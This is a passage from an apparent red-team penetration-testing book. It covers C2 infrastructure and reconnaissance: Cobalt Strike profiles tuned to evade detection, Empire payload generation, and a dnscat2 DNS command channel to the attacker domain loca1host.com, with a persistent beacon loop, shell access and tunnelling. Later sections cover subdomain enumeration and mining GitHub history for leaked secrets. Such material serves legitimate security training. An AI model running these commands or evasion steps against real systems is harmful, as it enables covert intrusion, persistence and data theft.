+C2 communication.  This allows you to have one compromised machine communicate
+to the internet, and all other machines on the network to communicate through the
+initial compromised host over SMB (https://www.cobaltstrike.com/help-smb-beacon). 
+This way, if one of the secondary systems is detected and forensics analysis is
+performed, they might not be able to identify the C2 domain associated with the attack.
+ 
+A neat feature of Cobalt Strike that immensely helps Red Teams is its ability to
+manipulate how your Beacons communicate.  Using Malleable C2 Profiles, you can
+have all your traffic from your compromised systems look like normal traffic.  We are
+getting into more and more environments where layer 7 application filtering is
+happening.  In layer 7, they are looking for anomalous traffic that many times this is
+over web communication.  What if we can make our C2 communication look like
+normal web traffic?  This is where Malleable C2 Profiles come into play.  Take a look
+at this example: https://github.com/rsmudge/Malleable-C2-
+Profiles/blob/master/normal/amazon.profile.  Some immediate notes:
+ 
+We see that these are going to be HTTP requests with URI paths:
+set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-
+keywords=books";
+The host header is set to Amazon:
+header "Host" "www.amazon.com";
+And even some custom Server headers are sent back from the C2 server
+header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
+header "x-amz-id-2"
+"a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
+ 
+Now that these have been used in many different campaigns, numerous security
+devices have created signatures on all of the common Malleable Profiles
+(https://github.com/rsmudge/Malleable-C2-Profiles).  What we have done to get
+around this is to make sure all the static strings are modified, make sure all User-Agent
+information is changed, configure SSL with real certificates (don't use default Cobalt
+Strike SSL certificates), use jitter, and change beacon times for the agents.  One last
+note is to make sure the communication happens over POST (http-post) commands as
+failing to do so may cause a lot of headache in using custom profiles.  If your profile
+communicates over http-get, it will still work, but uploading large files will take
+forever.  Remember that GET is generally limited to around 2048 characters.
+ 
+The team at SpectorOps also created Randomized Malleable C2 Profiles using:
+https://github.com/bluscreenofjeff/Malleable-C2-Randomizer.
+Cobalt Strike Aggressor Scripts
+||||||||||||||||||||||||||||||||||||||||
+
+Cobalt Strike has numerous people contributing to the Cobalt Strike project. 
+Aggressor Script is a scripting language for Red Team operations and adversary
+simulations inspired by scriptable IRC clients and bots. 
+Its purpose is two-fold: (1)
+You may create long running bots that simulate virtual Red Team members, hacking
+side-by-side with you, (2) you may also use it to extend and modify the Cobalt Strike
+client to your needs [https://www.cobaltstrike.com/aggressor-script/index.html].   For
+example, HarleyQu1nn has put together a great list of different aggressor scripts to use
+with your post exploitation: http://bit.ly/2qxIwPE.
+ 
+PowerShell Empire
+Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows
+agent, and a pure Python 2.6/2.7 Linux/OS X agent. 
+It is the merge of the previous
+PowerShell Empire and Python EmPyre projects. The framework offers
+cryptologically-secure communications and a flexible architecture. 
+On the PowerShell
+side, Empire implements the ability to run PowerShell agents without needing
+powershell.exe, rapidly deployable post-exploitation modules ranging from key
+loggers to Mimikatz, and adaptable communications to evade network detection, all
+wrapped up in a usability-focused framework
+[https://github.com/EmpireProject/Empire]. 
+ 
+For Red Teamers, PowerShell is one of our best friends.  After the initial payload, all
+subsequent attacks are stored in memory.  The best part of Empire is that it is actively
+maintained and updated so that all the latest post-exploitation modules are available
+for attacks.  They also have C2 connectivity for Linux and OS X.  So you can still
+create an Office Macro in Mac and, when executed, have a brand new agent in Empire.
+ 
+We will cover Empire in more detail throughout the book so you can see how effective
+it is.  In terms of setting up Empire, it is very important to ensure you have configured
+it securely:
+Set the CertPath to a real trusted SSL certificate.
+Change the DefaultProfile endpoints.  Many layer 7 firewalls look for the exact
+static endpoints.
+Change the User Agent used to communicate.
+ 
+Just like Metasploit's rc files used for automation in the prior books, Empire now
+supports autorun scripts for efficiency and effectiveness. 
+ 
+Running Empire:
+Starting up Empire
+cd /opt/Empire && ./setup/reset.sh
+Exit
+exit
+Setup Up Cert (best practice is to use real trusted certs)
+||||||||||||||||||||||||||||||||||||||||
+
+./setup/cert.sh
+Start Empire
+./empire
+Start a Listener
+listeners
+Pick your listener (we'll use http for our labs)
+uselistener [tab twice to see all listener types]
+uselistener http
+View all configurations for the listener
+info
+Set the following (i.e. set KillDate 12/12/2020):
+KillDate - The end of your campaign so your agents autocleanup
+DefaultProfile - Make sure to change all the endpoints (i.e.
+/admin/get.php,/news.php).  You can make them up however you want,
+such as /seriously/notmalware.php
+DefaultProfile - Make sure to also change your User Agent.  I like to
+look at the top User Agents used and pick one of those.
+Host - Change to HTTPS and over port 443
+CertPath - Add your path to your SSL Certificates
+UserAgent - Change this to your common User Agent
+Port - Set to 443
+ServerVersion - Change this to another common Server Header
+When you are all done, start your listener
+execute
+ 
+Configuring the Payload
+||||||||||||||||||||||||||||||||||||||||
+
+The payload is the actual malware that will run on the victim's system.  These payloads
+can run in Windows, Linux, and OSX, but Empire is most well-known for its
+PowerShell Windows Payloads:
+Go to the Main menu
+main
+Create stager available for OSX, Windows, Linux.  We are going to create a
+simple batfile as an example, but you can create macros for Office files or
+payloads for a rubber ducky
+usestager [tab twice to see all the different types]
+usestager windows/launcher_bat
+Look at all settings
+info
+Configure All Settings
+set Listener http
+Configure the UserAgent
+Create Payload
+generate
+Review your payload in another terminal window
+cat /tmp/launcher.bat
+ 
+ 
+As you can see, the payload that was created was heavily obfuscated.  You can now
+drop this .bat file on any Windows system.  Of course, you would probably create an
+Office Macro or a Rubber Ducky payload, but this is just one of many examples.
+ 
+If you don't already have PowerShell installed on your Kali image, the best way to do
+so is to install it manually.  Installing PowerShell on Kali:
+apt-get install libunwind8
+wget http://security.debian.org/debian-
+security/pool/updates/main/o/openssl/libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
+dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
+wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-
+7ubuntu0.3_amd64.deb
+dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
+wget
+https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.2-
+1.ubuntu.16.04_amd64.deb
+||||||||||||||||||||||||||||||||||||||||
+
+dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
+ 
+dnscat2
+This tool is designed to create an encrypted Command and Control (C2) channel over
+the DNS protocol, which is an effective tunnel out of almost every network
+[https://github.com/iagox86/dnscat2].
+ 
+C2 and exfiltration over DNS provides a great mechanism to hide your traffic, evade
+network sensors, and get around network restrictions.  In many restrictive or
+production environments, we come across networks that either do not allow outbound
+traffic or traffic that is heavily restricted/monitored.  To get around these protections,
+we can use a tool like dnscat2.  The reason we are focusing on dnscat2 is because it
+does not require root privileges and allows both shell access and exfiltration.
+ 
+In many secure environments, direct outbound UDP or TCP is restricted.  Why not
+leverage the services already built into the infrastructure?  Many of these protected
+networks contain a DNS server to resolve internal hosts, while also allowing
+resolutions of external resources.  By setting up an authoritative server for a malicious
+domain we own, we can leverage these DNS resolutions to perform Command and
+Control of our malware.
+ 
+ 
+In our scenario, we are going to set up our attacker domain called “loca1host.com”. 
+This is a doppelganger to “localhost” in the hopes that we can hide our traffic a little
+bit more.  Make sure to replace “loca1host.com” to the domain name you own.  We are
+going to configure loca1host.com's DNS information so it becomes an Authoritative
+DNS server.  In this example, we are going to use GoDaddy's DNS configuration tool,
+but you can use any DNS service.
+ 
+Setting Up an Authoritative DNS Server using GoDaddy
+First, make sure to set up a VPS server to be your C2 attacking server and get
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+the IP of that server
+Log into your GoDaddy (or similar) account after purchasing a domain
+Select your domain, click manage, and select Advanced DNS
+Next, set up Hostnames in the DNS Management to point to your Server
+ns1 (and put the IP of your VPS server)
+ns2 (and put the IP of your VPS server)
+Edit Nameservers to Custom
+Add ns1.loca1host.com
+Add ns2.loca1host.com
+ 
+ 
+As seen in the image above, we now have our nameservers pointing to
+ns1.loca1host.com and ns2.loca1host.com, which both point to our attacker VPS
+server.  If you try to resolve any subdomain for loca1host.com (i.e.
+vpn.loca1host.com), it will try to use our VPS server to perform those resolutions. 
+Luckily for us, dnscat2 listens on UDP port 53 and does all the heavy lifting for us.
+ 
+Next, we are going to need to fully set up our attacker server that is acting as our
+nameserver.  Setting up the dnscat2 Server:
+sudo su -
+apt-get update
+apt-get install ruby-dev
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+apt-get install gcc make
+gem install bundler
+bundle install
+Test to make sure it works: ruby ./dnscat2.rb
+Quick Note:  If you are using Amazon Lightsail, make sure to allow UDP port
+53
+ 
+For the client code, we will need to compile it to make a binary for a Linux payload. 
+Compiling the Client
+git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
+cd /opt/dnscat2/client/
+make
+We should now have a dnscat binary created! 
+(If in Windows: Load client/win32/dnscat2.vcproj into Visual Studio and hit
+||||||||||||||||||||||||||||||||||||||||
+
+"build")
+ 
+Now that we have our authoritative DNS configured, our attacker server running
+dnscat2 as a DNS server, and our malware compiled, we are ready to execute our
+payload.
+ 
+Before we begin, we need to start dnscat on our attacker server.  Although there are
+multiple configurations to enable, the main one is configuring the --secret flag to make
+sure our communication within the DNS requests are encrypted.  Make sure to replace
+loca1host.com with the domain name you own and create a random secret string.
+ 
+To start the dncat2 on your attacker server:
+screen
+ruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j
+ 
+Let's say you have some sort of RCE on a vulnerable server.  You are able to run shell
+commands and upload our dnscat payload.  To execute our payload:
+./dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j
+ 
+This will start dnscat, use our authoritative server, and create our C2 channel.  One
+thing I have seen is that there are times when dnscat2 dies.  This could be from large
+file transfers or something just gets messed up.  To circumvent these types of issues, I
+like to make sure that my dnscat payload returns.  For this, I generally like to start my
+dnscat payload with a quick bash script:
+nohup /bin/bash -c "while true; do /opt/dnscat2/client/dnscat loca1host.com --
+secret 39dfj3hdsfajh37e8c902j --max-retransmits 5; sleep 3600; done" >
+/dev/null 2>&1 &
+ 
+This will make sure that if the client side payload dies for any reason, it will spawn a
+new instance every hour.  Sometimes you only have one chance to get your payloads
+to run, so you need to make them count!
+ 
+Lastly, if you are going to run this payload on Windows, you could use the dnscat2
+payload or… why not just do it in PowerShell?!  Luke Baggett wrote up a PowerShell
+version of the dnscat client here: https://github.com/lukebaggett/dnscat2-powershell.
+ 
+The dnscat2 Connection
+After our payload executes and connects back to our attacker server, we should see a
+new ENCRYPTED AND VERIFIED message similar to below.  By typing "window"
+dnscat2 will show all of your sessions.  Currently, we have a single command session
+called "1".
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+We can spawn a terminal style shell by interacting with our command session:
+Interact with our first command sessions
+window -i 1
+Start a shell sessions
+shell
+Back out to the main session
+Ctrl-z
+Interact with the 2 session - sh
+window -i 2
+Now, you should be able to run all shell commands (i.e. ls)
+ 
+ 
+Although this isn't the fastest shell, due to the fact that all communication is over DNS,
+it really gets around those situations where a Meterpreter or similar shell just won't
+work.  What is even better about dnscat2 is that it fully supports tunneling.  This way,
+if we want to use an exploit from our host system, use a browser to tunnel internal
+websites, or even SSH into another box, it is all possible.
+Tunnel in dnscat2
+||||||||||||||||||||||||||||||||||||||||
+
+There are many times we want to route our traffic from our attacker server through our
+compromised host, to other internal servers.  The most secure way to do this with
+dnscat2 is to route our traffic through the local port and then tunnel it to an internal
+system on the network.  An example of this can be accomplished by the following
+command inside our command session:
+listen 127.0.0.1:9999 10.100.100.1:22
+ 
+Once the tunnel is created, we can go back to our root terminal window on our attacker
+machine, SSH to localhost over port 9999, and authenticate to an internal system on
+the victim's network. 
+ 
+ 
+This will provide all sorts of fun and a great test to see if your customer's networks can
+detect massive DNS queries and exfiltration.  So, what do the request and responses
+look like?  A quick Wireshark dump shows that dnscat2 creates massive amounts of
+different DNS requests to many different long subdomains.
+ 
+ 
+Now, there are many other protocols that you might want to test.  For example,
+Nishang has a PowerShell based ICMP Shell (http://bit.ly/2GXhdnZ) that uses
+https://github.com/inquisb/icmpsh as the C2 server.  There are other ICMP shells like
+https://github.com/jamesbarlow/icmptunnel,
+https://github.com/DhavalKapil/icmptunnel and http://code.gerade.org/hans/.
+ 
+p0wnedShell
+As stated on p0wnedShell’s Github page, this tool is “an offensive PowerShell host
+application written in C# that does not rely on powershell.exe but runs powershell
+commands and functions within a powershell runspace environment (.NET). 
+It has a
+lot of offensive PowerShell modules and binaries included to make the process of Post
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Exploitation easier. What we tried was to build an “all in one” Post Exploitation tool
+which we could use to bypass all mitigations solutions (or at least some off), and that
+has all relevant tooling included. You can use it to perform modern attacks within
+Active Directory environments and create awareness within your Blue team so they
+can build the right defense strategies.” [https://github.com/Cn33liz/p0wnedShell] 
+ 
+Pupy Shell
+Pupy is “an opensource, cross-platform (Windows, Linux, OSX, Android) remote
+administration and post-exploitation tool mainly written in python.”
+[https://github.com/n1nj4sec/pupy]. 
+ 
+One of the awesome features of Pupy is that you can run Python across all of your
+agents without having a Python actually installed on all of your hosts.  So, if you are
+trying to script out a lot of your attacks in a custom framework, Pupy is an easy tool
+with which to do this.
+ 
+PoshC2
+PoshC2 is “a proxy aware C2 framework written completely in PowerShell to aid
+penetration testers with red teaming, post-exploitation and lateral movement. The tools
+and modules were developed off the back of our successful PowerShell sessions and
+payload types for the Metasploit Framework. PowerShell was chosen as the base
+language as it provides all of the functionality and rich features required without
+needing to introduce multiple languages to the framework.”
+[https://github.com/nettitude/PoshC2]
+ 
+Merlin
+Merlin (https://github.com/Ne0nd0g/merlin) takes advantage of a recently developed
+protocol called HTTP/2 (RFC7540).  Per Medium, "HTTP/2 communications are
+multiplexed, bi-direction connections that do not end after one request and response.
+Additionally, HTTP/2 is a binary protocol that makes it more compact, easy to parse,
+and not human readable without the use of an interpreting tool.”
+[https://medium.com/@Ne0nd0g/introducing-merlin-645da3c635a#df21]
+ 
+Merlin is a tool written in GO, looks and feels similar to PowerShell Empire, and
+allows for a lightweight agent.  It doesn't support any types of post exploitation
+modules, so you will have to do it yourself. 
+ 
+Nishang
+Nishang (https://github.com/samratashok/nishang) is a framework and collection of
+scripts and payloads which enables usage of PowerShell for offensive security,
+||||||||||||||||||||||||||||||||||||||||
+
+penetration testing and Red Teaming. 
+Nishang is useful during all phases of
+penetration testing.
+ 
+Although Nishang is really a collection of amazing PowerShell scripts, there are some
+scripts for lightweight Command and Control.
+ 
+Conclusion
+Now, you are finally prepared to head into battle with all of your tools and servers
+configured.  Being ready for any scenario will help you get around any obstacle from
+network detection tools, blocked protocols, host based security tools, and more. 
+ 
+For the labs in this book, I have created a full Virtual Machine based on Kali Linux
+with all the tools.  This VMWare Virtual Machine can be found here:
+http://thehackerplaybook.com/get.php?type=THP-vm
+.  Within the THP archive,
+there is a text file named List_of_Tools.txt which lists all the added tools.  The default
+username/password is the standard root/toor.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+ 
+ 
+ 
+ 
+ 
+2 before the snap - red team recon
+ 
+ 
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+In the last THP, the Before The Snap section focused on using different tools such as
+Recon-NG, Discover, Spiderfoot, Gitrob, Masscan, Sparta, HTTP Screenshot,
+Vulnerability Scanners, Burp Suite and more.  These were tools that we could use
+either externally or internally to perform reconnaissance or scanning of our victim's
+infrastructure.  We are going to continue this tradition and expand on the
+reconnaissance phase from a Red Team perspective. 
+ 
+Monitoring an Environment
+For Red Team campaigns, it is often about opportunity of attack.  Not only do you
+need to have your attack infrastructure ready at a whim, but you also need to be
+constantly looking for vulnerabilities.  This could be done through various tools that
+scan the environments, looking for services, cloud misconfigurations, and more. 
+These activities allow you to gather more information about the victim’s infrastructure
+and find immediate avenues of attack.
+Regular Nmap Diffing
+For all our clients, one of the first things we do is set up different monitoring scripts. 
+These are usually just quick bash scripts that email us daily diffs of a client's network. 
+Of course, prior to scanning, make sure you have proper authorization to perform
+scanning.
+ 
+For client networks that are generally not too large, we set up simple cronjob to
+perform external port diffing.  For example, we could create a quick Linux bash script
+to do the hard work (remember to replace the IP range):
+#!/bin/bash
+mkdir /opt/nmap_diff
+d=$(date +%Y-%m-%d)
+y=$(date -d yesterday +%Y-%m-%d)
+/usr/bin/nmap -T4 -oX /opt/nmap_diff/scan_$d.xml 
+10.100.100.0/24
+ >
+/dev/null 2>&1
+if [ -e /opt/nmap_diff/scan_$y.xml ]; then
+    /usr/bin/ndiff /opt/nmap_diff/scan_$y.xml /opt/nmap_diff/scan_$d.xml >
+/opt/nmap_diff/diff.txt
+fi
+ 
+This is a very basic script that runs nmap every day using default ports and then uses
+ndiff to compare the results.  We can then take the output of this script and use it to
+notify our team of new ports discovered daily.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+In the last book, we talked heavily about the benefits of Masscan
+(https://github.com/robertdavidgraham/masscan) and how much faster it is than nmap. 
+The developers of Masscan stated that, with a large enough network pipeline, you
+could scan the entire internet in 6 minutes.  The one issue we have seen is with
+Masscan's reliability when scanning large ranges.  It is great for doing our initial
+reconnaissance, but generally isn't used for diffing.
+ 
+Lab:
+Labs in THP3 are completely optional.  In some sections, I have included addition labs
+to perform testing or for areas that you can expand on.  Since this is all about learning
+and finding your own passion, I highly recommend you spend the time to make our
+tools better and share it with the community. 
+ 
+Build a better network diff scanner:
+Build a better port list than the default nmap (i.e. nmap default misses ports like
+Redis 6379/6380 and others)
+Implement nmap banners
+Keep historical tracking of ports
+Build email alerting/notification system
+Check out diff Slack Alerts: http://bit.ly/2H1o5AW
+Web Screenshots
+Other than regularly scanning for open ports/services, it is important for Red Teams to
+also monitor for different web applications.  We can use two tools to help monitor for
+application changes.
+ 
+The first web screenshot tool that we commonly use is HTTPScreenshot
+(https://github.com/breenmachine/httpscreenshot).  The reason HTTPScreenshot is so
+powerful is that it uses Masscan to scan large networks quickly and uses phantomjs to
+take screencaptures of any websites it detects.  This is a great way to get a quick layout
+of a large internal or external network.
+ 
+Please remember that all tool references in this book are run from the THP modified
+||||||||||||||||||||||||||||||||||||||||
+
+Kali Virtual Machine.  You can find the Virtual Machine here: 
+http://thehackerplaybook.com/get.php?type=THP-vm.   The username password is the
+default: root/toor.
+ 
+cd /opt/httpscreenshot/
+Edit the networks.txt file to pick the network you want to scan:
+gedit networks.txt
+./masshttp.sh
+firefox clusters.html
+ 
+ 
+The other tool to check out is Eyewitness
+(https://github.com/ChrisTruncer/EyeWitness).    Eyewitness is another great tool that
+takes an XML file from nmap output and screenshots webpages, RDP servers, and
+VNC Servers.
+ 
+Lab:
+cd /opt/EyeWitness
+nmap [IP Range]/24 --open -p 80,443 -oX scan.xml
+python ./EyeWitness.py -x scan.xml --web
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Cloud Scanning
+As more and more companies switch over to using different cloud infrastructures, a lot
+of new and old attacks come to light.  This is usually due to misconfigurations and a
+lack of knowledge on what exactly is publicly facing on their cloud infrastructure. 
+Regardless of Amazon EC2, Azure, Google cloud, or some other provider, this has
+become a global trend.
+ 
+For Red Teamers, a problem is how do we search on different cloud environments? 
+Since many tenants use dynamic IPs, their servers might not only change rapidly, but
+they also aren’t listed in a certain block on the cloud provider.  For example, if you use
+AWS, they own huge ranges all over the world.  Based on which region you pick, your
+server will randomly be dropped into a /13 CIDR range.  For an outsider, finding and
+monitoring these servers isn't easy.
+ 
+First, it is important to figure out where the IP ranges are owned by different
+providers.  Some of the examples are:
+Amazon: http://bit.ly/2vUSjED
+Azure: http://bit.ly/2r7rHeR
+Google Cloud: http://bit.ly/2HAsZFm
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+As you can tell these ranges are huge and scanning them manually would be very hard
+to do.  Throughout this chapter, we will be reviewing how we can gain the information
+on these cloud systems.
+ 
+Network/Service Search Engines
+To find cloud servers, there are many great resources freely available on the internet to
+perform reconnaissance on our targets.  We can use everything from Google all the
+way to third party scanning services.  Using these resources will allow us to dig into a
+company and find information about servers, open services, banners, and other details
+passively.  The company will never know that you queried for this type of
+information.  Let’s see how we use some of these resources as Red Teamers.
+Shodan
+Shodan (https://www.shodan.io) is a great service that regularly scans the internet,
+grabbing banners, ports, information about networks, and more.  They even have
+vulnerability information like Heartbleed.  One of the most fun uses for Shodan is
+looking through open web cams and playing around with them.  From a Red Team
+perspective, we want to find information about our victims.
+ 
+A Few Basic Search Queries:
+title: Search the content scraped from the HTML tag
+html: Search the full HTML content of the returned page
+product: Search the name of the software or product identified in the banner
+net: Search a given netblock (example: 204.51.94.79/18)
+ 
+We can do some searches on Shodan for cyberspacekittens:
+cyberspacekittens.com
+Search in the Title HTML Tag
+title:cyberspacekittens
+Search in the Context of the page
+html:cyberspacekittens.com
+ 
+Note, I have noticed that Shodan is a little slow in its scans.  It took more than a month
+to get my servers scanned and put into the Shodan database.
+ 
+Censys.io
+Censys continually monitors every reachable server and device on the Internet, so you
+can search for and analyze them in real time. You will be able to understand your
+network attack surface, discover new threats, and assess their global impact
+[https://censys.io/].  One of the best features of Censys is that it scrapes information
+from SSL certificates.  Typically, one of the major difficulties for Red Teamers is
+finding where our victim's servers are located on cloud servers.  Luckily, we can use
+Censys.io to find this information as they already parse this data. 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+The one issue we have with these scans is that they can sometime be days or weeks
+behind.  In this case, it took one day to get scanned for title information.  Additionally,
+after creating an SSL certificate on my site, it took four days for the information to
+show up on the Censys.io site.  In terms of data accuracy, Censys.io was decently
+reliable. 
+ 
+Below, we ran scans to find info about our target cyberspacekittens.com.  By parsing
+the server's SSL certificate, we were able to identify that our victim's server was
+hosted on AWS.
+ 
+ 
+ 
+There is also a Censys script tool to query it via a scripted process:
+https://github.com/christophetd/censys-subdomain-finder.
+ 
+Manually Parsing SSL 
+Certificates
+We commonly find that companies do not realize what they have available on the
+internet.  Especially with the increase of cloud usage, many companies do not have
+ACLs properly implemented.  They believe that their servers are protected, but we
+discover that they are publicly facing.  These include Redis databases, Jenkin servers,
+Tomcat management, NoSQL databases, and more – many of which led to remote
+code execution or loss of PII. 
+ 
+The cheap and dirty way to find these cloud servers is by manually scanning SSL
+certificates on the internet in an automated fashion.  We can take the list of IP ranges
+for our cloud providers and scan all of them regularly to pull down SSL certificates. 
+Looking at the SSL certs, we can learn a great deal about an organization.  From the
+scan below of the cyberspacekittens range, we can see hostnames in certificates with
+.int. for internal servers, .dev. for development, vpn. for VPN servers, and more. 
+Many times you can gain internal hostnames that might not have public IPs or
+whitelisted IPs for their internal networks.
+ 
+To assist in scanning for hostnames in certificates, sslScrape was developed for THP3. 
+This tool utilizes Masscan to quickly scan large networks.  Once it identifies services
+||||||||||||||||||||||||||||||||||||||||
+
+on port 443, it then strips the hostnames in the certificates.
+ 
+sslScrape (https://github.com/cheetz/sslScrape):
+cd /opt/sslScrape
+python ./sslScrape.py [IP Address  CIDR Range]
+ 
+ 
+Examples of Cloud IP Addresses:
+Amazon: http://bit.ly/2vUSjED
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Azure: http://bit.ly/2r7rHeR
+Google Cloud: http://bit.ly/2HAsZFm
+ 
+Throughout this book, I try to provide examples and an initial framework.  However, it
+is up to you to develop this further.  I highly recommend you take this code as a start,
+save all hostnames to a database, make a web UI frontend, connect additional ports
+that might have certs like 8443, and maybe even look for some vulnerabilities like
+.git/.svn style repos.
+ 
+Subdomain Discovery
+In terms of identifying IP ranges, we can normally look up the company from public
+sources like the American Registry for Internet Numbers (ARIN) at
+https://www.arin.net/.  We can look up IP address space to owners, search Networks
+owned by companies, Autonomous System Numbers by organization, and more.  If we
+are looking outside North America, we can look up via AFRINIC (Africa), APNIC
+(Asia), LACNIC (Latin America), and RIPE NCC (Europe).  These are all publicly
+available and listed on their servers. 
+ 
+You can look up any hostname or FQDN to find the owner of that domain through
+many available public sources (one of my favorites to quickly lookup ownership is
+https://centralops.net/co/domaindossier.aspx).  What you can't find listed anywhere are
+subdomains.  Subdomain information is stored on the target's DNS server versus
+registered on some central public registration system.  You have to know what to
+search for to find a valid subdomain. 
+ 
+Why are subdomains so important to find for your victim targets?  A few reasons are:
+Some subdomains can indicate the type of server it is (i.e. dev, vpn, mail,
+internal, test).  For example, mail.cyberspacekittens.com.
+Some servers do not respond by IP.  They could be on shared infrastructure and
+only respond by fully qualified domains.  This is very common to find on cloud
+infrastructure.  So you can nmap all day, but if you can’t find the subdomain,
+you won't really know what applications are behind that IP.
+Subdomains can provide information about where the target is hosting their
+servers.  This is done by finding all of a company's subdomains, performing
+reverse lookups, and finding where the IPs are hosted.  A company could be
+using multiple cloud providers and datacenters.
+ 
+We did a lot of discovery in the last book, so let's review some of the current and new
+tools to perform better discovery.  Feel free to join in and scan the
+cyberspacekittens.com domain.
+Discover Scripts
+Discover Scripts (https://github.com/leebaird/discover) tool is still one of my favorite
+||||||||||||||||||||||||||||||||||||||||
+
+recon/discovery tools discussed in the last book.  This is because it combines all the
+recon tools on Kali Linux and is maintained regularly.  The passive domain recon will
+utilize all the following tools: Passive uses ARIN, dnsrecon, goofile, goog-mail,
+goohost, theHarvester, Metasploit, URLCrazy, Whois, multiple websites, and recon-
+ng.
+git clone https://github.com/leebaird/discover /opt/discover/
+cd /opt/discover/
+./update.sh
+./discover.sh
+Domain
+Passive
+[Company Name]
+[Domain Name]
+firefox /root/data/[Domain]/index.htm
+ 
+The best part of Discover scripts is that it takes the information it gathers and keeps
+searching based on that information.  For example, from searching through the public
+PGP repository it might identify emails and then use that information to search Have I
+Been Pwned (through Recon-NG).  That will let us know if any passwords have been
+found through publicly-released compromises (which you will have to find on your
+own).
+KNOCK
+Next, we want to get a good idea of all the servers and domains a company might use. 
+Although there isn’t a central place where subdomains are stored, we can bruteforce
+different subdomains with a tool, such as Knock, to identify what servers or hosts
+might be available for attack.
+ 
+Knockpy is a python tool designed to enumerate subdomains on a target domain
+through a wordlist.
+ 
+Knock is a great subdomain scan tool that takes a list of subdomains and checks it to
+see if it resolves.  So if you have cyberspacekittens.com, Knock will take this wordlist
+(http://bit.ly/2JOkUyj), and see if there are any subdomains for
+[subdomain].cyberspacekittens.com.  Now, the one caveat here is that it is only as
+good as your word list.  Therefore, having a better wordlist increases your chances of
+finding subdomains. 
+ 
+One of my favorite subdomains is created by jhaddix and is located here:
+http://bit.ly/2qwxrxB.  Subdomains are one of those things that you should always be
+collecting.  Some other good lists can be found on your THP Kali image under
+/opt/SecLists or here:
+https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS. 
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Lab: 
+Find all the subdomains for cyberspacekittens.com:
+cd /opt/knock/knockpy
+python ./knockpy.py cyberspacekittens.com
+This uses the basic wordlist from Knock.  Try downloading and using a much
+larger wordlist.  Try using the http://bit.ly/2qwxrxB list using the -u switch. 
+(i.e. python ./knockpy.py cyberspacekittens.com -u all.txt).
+ 
+What types of differences did you find from Discover scripts?  What types of domains
+would be your first targets for attacks or used with spearphishing domain attacks? Go
+and give it a try in the real world.  Go find a bug bounty program and look for juicy-
+looking subdomains.
+Sublist3r
+As previously mentioned, the problem with Knock is that it is only as good as your
+wordlist.  Some companies have very unique subdomains that can't be found through a
+common wordlist.  The next best resource to go to are search engines.  As sites get
+spidered, files with links get analyzed and scraped public resources become available,
+which means we can use search engines to do the hard work for us. 
+ 
+This is where we can use a tool like Sublist3r.  Note, using a tool like this uses
+different "google dork" style search queries that can look like a bot.  This could get
+you temporarily blacklisted and require you to fill out a captcha with every request,
+which may limit the results from your scan.  To run Sublister:
+cd /opt/Sublist3r
+python sublist3r.py -d cyberspacekittens.com -o cyberspacekittens.com
+ 
+Notice any results that might have never been found from subdomain bruteforcing? 
+Again, try this against a bug bounty program to see significant differences between
+bruteforcing and using search engines.
+ 
+*There is a forked version of Sublist3r that also performs subdomain checking:
+https://github.com/Plazmaz/Sublist3r.
+SubBrute
+The last subdomain tool is called SubBrute.  SubBrute is a community-driven project
+with the goal of creating the fastest, and most accurate subdomain enumeration tool.
+Some of the magic behind SubBrute is that it uses open resolvers as a kind of proxy to
+circumvent DNS rate-limiting (https://www.us-cert.gov/ncas/alerts/TA13-088A). This
+design also provides a layer of anonymity, as SubBrute does not send traffic directly to
+the target's name servers. [https://github.com/TheRook/subbrute]
+ 
+Not only is SubBrute extremely fast, it performs a DNS spider feature that crawls
+enumerated DNSrecords.  To run SubBrute:
+cd /opt/subbrute
+||||||||||||||||||||||||||||||||||||||||
+
+./subbrute.py cyberspacekittens.com
+ 
+We can also take SubBrute to the next level and combine it with MassDNS to perform
+very high-performance DNS resolution (http://bit.ly/2EMKIHg).
+Github
+Github is a treasure trove of amazing data.  There have been a number of penetration
+tests and Red Team assessments where we were able to get passwords, API keys, old
+source code, internal hostnames/IPs, and more.  These either led to a direct
+compromise or assisted in another attack.  What we see is that many developers either
+push code to the wrong repo (sending it to their public repository instead of their
+company’s private repository), or accidentally push sensitive material (like passwords)
+and then try to remove it.  One good thing with Github is that it tracks every time code
+is modified or deleted.  That means if sensitive code at one time was pushed to a
+repository and that sensitive file is deleted, it is still tracked in the code changes.  As
+long as the repository is public, you will be able to view all of these changes. 
+ 
+We can either use Github search to identify certain hostnames/organizational names or
+even just use simple Google Dork search, for example:
+site:github.com + "cyberspacekittens”. 
+ 
+Try searching bug bounty programs using different organizations instead of searching
+for cyberspacekittens for the following examples.
+ 
+Through all your searching, you come across:
+https://github.com/cyberspacekittens/dnscat2 (modified example for GitHub lab).  You
+can manually take a peek at this repository, but usually it will be so large that you will
+have a hard time going through all of the projects to find anything juicy. 
+ 
+As mentioned before, when you edit or delete a file in Github, everything is tracked. 
+Fortunately for Red Teamers, many people forget about this feature. Therefore, we
+often see people put sensitive information into Github, delete it, and not realize it's still
